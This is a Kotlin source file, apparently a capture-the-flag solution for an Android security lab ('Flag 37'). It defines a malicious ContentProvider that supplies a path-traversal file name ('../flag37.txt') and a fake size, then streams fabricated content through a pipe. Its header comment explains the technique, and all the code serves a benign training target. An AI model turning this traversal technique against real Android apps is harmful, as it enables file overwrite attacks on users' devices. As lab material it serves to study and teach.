package com.vishal2376.hextreepoc

import android.content.ContentProvider
import android.content.ContentValues
import android.database.Cursor
import android.database.MatrixCursor
import android.net.Uri
import android.os.ParcelFileDescriptor
import android.provider.OpenableColumns
import android.util.Log
import java.io.FileNotFoundException
import java.io.IOException

/**
 * FLAG 37 - Filename Traversal
 * Technique: Custom malicious ContentProvider serving fake metadata + a pipe-streamed file
 *
 * Flow:
 * 1. We build a provider that lies about a file's name/size via query()
 * 2. Flag37Activity queries our URI, trusts DISPLAY_NAME="../flag37.txt" and SIZE=1337
 * 3. It then calls openFile() on the same URI expecting those exact values
 * 4. We stream "give flag" through a pipe instead of a real file - no file ever exists
 * 5. Flag37Activity validates filename+size+content match -> success()
 *
 * Key insight: ContentProvider never requires the data to be "real" - query() and
 * openFile() are two independent calls you fully control. A pipe (createPipe())
 * lets you fabricate file content live, with no backing file on disk at all.
 */
class FileAttackProvider : ContentProvider() {

	override fun onCreate(): Boolean {
		Log.i("AttackProvider", "onCreate()")
		return true
	}

	override fun query(
		uri: Uri,
		projection: Array<String>?,
		selection: String?,
		selectionArgs: Array<String>?,
		sortOrder: String?,
	): Cursor {
		Log.i("AttackProvider", "query($uri)")

		val cursor = MatrixCursor(arrayOf(OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE))
		cursor.addRow(arrayOf("../flag37.txt", 1337))
		return cursor
	}

	override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor {
		Log.i("AttackProvider", "openFile($uri)")

		return try {
			val pipe = ParcelFileDescriptor.createPipe()
			val outputStream = ParcelFileDescriptor.AutoCloseOutputStream(pipe[1])

			Thread {
				try {
					outputStream.write("give flag".toByteArray())
					outputStream.close()
				} catch (e: IOException) {
					Log.e("AttackProvider", "Error writing to pipe", e)
				}
			}.start()

			pipe[0]
		} catch (e: IOException) {
			throw FileNotFoundException("Could not open pipe for: $uri")
		}
	}

	override fun delete(uri: Uri, selection: String?, selectionArgs: Array<String>?): Int {
		Log.i("AttackProvider", "delete($uri)")
		throw UnsupportedOperationException("Not yet implemented")
	}

	override fun getType(uri: Uri): String? {
		Log.i("AttackProvider", "getType($uri)")
		throw UnsupportedOperationException("Not yet implemented")
	}

	override fun insert(uri: Uri, values: ContentValues?): Uri? {
		Log.i("AttackProvider", "insert($uri)")
		throw UnsupportedOperationException("Not yet implemented")
	}

	override fun update(
		uri: Uri,
		values: ContentValues?,
		selection: String?,
		selectionArgs: Array<String>?,
	): Int {
		Log.i("AttackProvider", "update($uri)")
		throw UnsupportedOperationException("Not yet implemented")
	}
}